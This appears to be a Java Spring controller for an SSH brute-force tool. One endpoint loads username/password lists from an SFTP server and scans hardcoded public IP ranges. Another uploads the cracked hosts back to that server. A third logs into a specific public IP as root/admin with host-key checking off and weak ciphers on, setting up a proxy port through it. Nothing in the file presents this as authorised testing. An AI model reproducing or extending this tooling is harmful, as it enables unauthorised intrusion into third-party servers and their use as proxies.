package restcontroller;

import Business.ScanSSH;
import Pojos.*;
import Service.GetInfoService;
import Service.IPService;
import Service.ReadService;
import Service.UploadService;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;

import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class TestController {

    @Autowired
    IPService iPService;
    @Autowired
    ReadService readService;
    @Autowired
    ScanSSH scanSSH;
    @Autowired
    GetInfoService getInfoService;
    @Autowired
    UploadService uploadService;

    @RequestMapping(value = "/test", method = RequestMethod.GET)
    public String test(
            @RequestParam("name") String name
    ) {
        try {

            List<String> range = new ArrayList<>();
            List<String> userpass = readService.readFileTMPFromSFtpServer(name);
            List<InfoToConnectSSH> info = getInfoService.getListUserPass(userpass);
            range.add("118.69.60.253-118.69.60.254");
            range.add("118.70.181.50-118.70.181.51");
            //get file range
            scanSSH.setListsRange(range);
            scanSSH.setListsUserPass(info);
            scanSSH.setNumberOfThreads(1);
            scanSSH.StartSetting();

            int a = 0;
        } catch (Exception e) {
            e.getMessage();
        }
        return "test ";
    }

    @RequestMapping(value = "/testupload", method = RequestMethod.GET)
    public String test2() {
        try {
            uploadService.uploadFileTempToSFtpServer(scanSSH.getListsResultIps());
            if (scanSSH.getListsResultIps() != null && scanSSH.getListsResultIps().size() > 0) {
                return scanSSH.getListsResultIps().get(0).getHost();
            }
            int a = 0;
        } catch (Exception e) {
            e.getMessage();
        }
        return "test ";
    }

    @RequestMapping(value = "/testread", method = RequestMethod.GET)
    public String testread() {
        try {
            readService.readFileTMPFromSFtpServer("ListUserPass.txt");
            int a = 0;
        } catch (Exception e) {
            e.getMessage();
        }
        return "test ";
    }

    @RequestMapping(value = "/testlistfile", method = RequestMethod.GET)
    public String testlistfile() {
        try {
            getInfoService.getListFileOnSFtpServer();
            int a = 0;
        } catch (Exception e) {
            e.getMessage();
        }
        return "test ";
    }

    @RequestMapping(value = "/testport", method = RequestMethod.GET)
    public String testport() throws MalformedURLException {
        int lport = 1080;
        String rhost = "14.161.6.63";
        int rport = 80;
        Session session = null;
        try {

            String host = "14.161.6.63";
            String user = "root";
            String password = "admin";
            int port = 22;
            JSch s = new JSch();
            session = s.getSession(user, host, port);
            session.setPassword(password);
            session.setTimeout(15000);
            session.setConfig("StrictHostKeyChecking", "no");
            session.setConfig("GSSAPIAuthentication", "no");
            session.setConfig("kex", "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256");
            session.setConfig("server_host_key", "ssh-dss,ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521");
            session.setConfig("cipher.c2s",
                    "blowfish-cbc,3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr,3des-ctr,arcfour,arcfour128,arcfour256");

            session.connect();
            
            
            ChannelExec channel = (ChannelExec) session.openChannel("exec");


            int a = 0;
        } catch (Exception e) {
            session.disconnect();
            e.getMessage();

        }
        return "test ";
    }

}
